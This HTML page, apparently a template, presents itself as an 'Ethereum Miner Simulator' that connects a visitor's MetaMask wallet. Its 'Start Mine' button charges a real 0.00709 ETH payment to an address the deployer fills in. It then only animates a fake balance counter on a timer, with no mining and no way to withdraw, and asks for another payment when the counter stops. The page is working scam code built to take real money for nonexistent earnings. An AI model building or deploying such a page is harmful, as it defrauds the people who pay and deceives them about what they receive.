<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Ethereum Miner Simulator</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <style>
    body {
      background: #111;
      color: #eee;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    button {
      padding: 12px 25px;
      font-size: 16px;
      margin-top: 20px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    #balance {
      margin-top: 20px;
      font-size: 20px;
      color: #0f0;
    }
  </style>
</head>
<body>
  <h1>Ethereum Miner Simulator</h1>
  <button onclick="connectWallet()">Connect Wallet</button>
  <div id="walletAddress"></div>
  <button onclick="startMining()" id="mineBtn" disabled>Start Mine</button>
  <div id="status"></div>
  <div id="balance">Balance: 0 ETH</div>

  <script>
    let provider;
    let signer;
    let userAddress;
    let miningInterval;
    let mining = false;
    let minedETH = 0;
    const miningRate = 0.00000000382;
    const maxETH = 0.0099;
    const miningFee = "0.00709";

    async function connectWallet() {
      if (typeof window.ethereum !== 'undefined') {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        document.getElementById("walletAddress").innerText = `Connected: ${userAddress}`;
        document.getElementById("mineBtn").disabled = false;
      } else {
        alert("MetaMask is not installed.");
      }
    }

    async function startMining() {
      if (mining) {
        alert("Mining already in progress.");
        return;
      }

      const tx = {
        to: "0xYourWalletAddressHere", // Replace with your ETH address
        value: ethers.utils.parseEther(miningFee)
      };

      try {
        const response = await signer.sendTransaction(tx);
        document.getElementById("status").innerText = "Waiting for payment confirmation...";
        await response.wait();
        document.getElementById("status").innerText = "Payment confirmed! Mining started.";
        startMiningSimulation();
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Payment failed or cancelled.";
      }
    }

    function startMiningSimulation() {
      mining = true;
      miningInterval = setInterval(() => {
        if (minedETH >= maxETH) {
          clearInterval(miningInterval);
          mining = false;
          document.getElementById("status").innerText = "Mining complete. Please pay to start again.";
          return;
        }

        minedETH += miningRate;
        document.getElementById("balance").innerText = `Balance: ${minedETH.toFixed(9)} ETH`;
      }, 1000); // every second
    }
  </script>
</body>
</html>
